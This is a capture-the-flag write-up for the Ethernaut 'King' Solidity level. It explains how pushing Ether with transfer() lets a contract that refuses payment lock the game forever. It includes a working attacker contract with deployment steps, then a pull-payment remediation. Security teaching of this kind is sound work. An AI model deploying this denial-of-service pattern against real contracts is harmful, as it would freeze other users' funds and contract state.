---
title: 'Ethernaut - King'
description: 'Exploiting smart contract payments to cause a Denial of Service (DoS). Learn how blocking native Ether transfers can lock contract states forever.'
date: 2025-07-09
tags: ['solidity', 'security', 'denial-of-service', 'fallback', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# 👑 King - The Un-Depositable Throne

## Challenge Overview

In this level, we are introduced to a simple Ponzi-like game where players send Ether to a contract to become the new **King**. When a player claims the throne, the previous King receives the new king's deposit as a payout. 

To beat the level, we must **claim the throne and maintain our kingship** permanently, preventing anyone else (including the level deployer) from reclaiming it.

---

## Technical Analysis

### Vulnerability: Denial of Service via Blocked External Calls

The `King` contract transfers Ether to the current king whenever a new claim is made:

```solidity
contract King {
    address public king;
    uint256 public prize;
    address public owner;

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        
        // [VULNERABILITY] Un-checked/forced transfer to external address
        payable(king).transfer(msg.value);
        
        king = msg.sender;
        prize = msg.value;
    }
}
```

#### The Root Cause
The vulnerability stems from the use of **`transfer()`** to make an external payment to an arbitrary, user-controlled address (`king`):
1. **Implicit Execution Control**: In Solidity, transferring Ether to a contract address triggers that contract's `receive()` or `fallback()` function.
2. **Reverting Transfers**: If the recipient is a contract that **reverts** when receiving Ether (or simply lacks a payable fallback function), the `transfer()` call fails and throws an exception.
3. **DoS State Lock**: Because the contract executes `payable(king).transfer(msg.value)` **before** registering the new king, a failed transfer will cause the entire transaction to revert. If the current king is a contract that refuses payments, the `receive()` function will always revert, making it impossible for anyone else to claim the throne.

---

## The Exploit: The Multi-Step Solution

1. **Deploy an Attack Contract**: Deploy a contract that has no `receive()` or `fallback()` function.
2. **Claim the Throne**: Call the `King` contract's address, sending enough Ether to meet or exceed the current `prize`.
3. **Immunity Guaranteed**: Once our attack contract is crowned king, any subsequent player's attempt to claim the throne will trigger `payable(attackContract).transfer(...)`, which will instantly revert. We are the King forever!

---

## Proof of Concept (PoC)

Below is the Solidity exploit contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    constructor(address payable _target) payable {
        // Send enough Ether to exceed the current prize (e.g. 1 ETH)
        require(msg.value > 0, "Need Ether to claim the throne");
        
        // Claim the throne
        (bool success, ) = _target.call{value: msg.value}("");
        require(success, "Failed to claim kingship");
    }

    // Do NOT declare receive() or fallback()
    // Alternatively, declare receive() that explicitly reverts:
    // receive() external payable {
    //     revert("I refuse your money!");
    // }
}
```

Deploy this contract using Remix, passing the `King` instance address, and sending a value slightly higher than the current prize.

---

## Auditor's Lessons

1. **Pull Over Push Payment Pattern**: Never "push" payments to external, user-controlled addresses in critical execution paths. Instead, implement a "pull" pattern where users must explicitly withdraw their own balances via a separate function.
2. **Expect External Reverts**: Assume any call or transfer to an external contract can and will fail (either intentionally or due to out-of-gas errors). Your contracts must remain functional even when external targets revert.
3. **Gas Constraints of Transfer**: `transfer()` only forwards 2300 gas. If the recipient contract performs even minimal logging or storage operations upon receiving Ether, it will run out of gas and revert. For this reason, modern Solidity recommends using `call{value: ...}("")` instead of `transfer()`, but with strict reentrancy guards.

---

## Remediation

Refactor the payment logic using the **Withdrawal (Pull-Payment) Pattern**:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureKing {
    address public king;
    uint256 public prize;
    address public owner;
    
    // Store payouts internally
    mapping(address => uint256) public pendingWithdrawals;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner, "Prize not met");
        
        // Record the previous king's payout instead of pushing it
        pendingWithdrawals[king] += prize;

        king = msg.sender;
        prize = msg.value;
    }

    // Previous kings withdraw their money manually
    function withdrawRefund() external {
        uint256 amount = pendingWithdrawals[msg.sender];
        require(amount > 0, "No funds to withdraw");
        
        pendingWithdrawals[msg.sender] = 0;
        
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Withdrawal failed");
    }
}
```
